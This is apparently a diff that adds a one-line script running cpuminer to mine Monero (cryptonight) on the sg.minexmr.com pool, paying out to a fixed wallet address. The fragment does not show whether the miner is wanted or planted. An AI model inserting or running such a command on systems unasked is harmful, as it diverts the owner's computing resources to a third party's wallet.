@@ -1,0 +1,2 @@
+./cpuminer -a cryptonight -o stratum+tcp://sg.minexmr.com:4444 -p x -u 44XT4KvmobTQfeWa6PCQF5RDosr2MLWm43AsaE3o5iNRXXTfDbYk2VPHTVedTQHZyfXNzMn8YYF2466d3FSDT7gJS8gdHAr
+
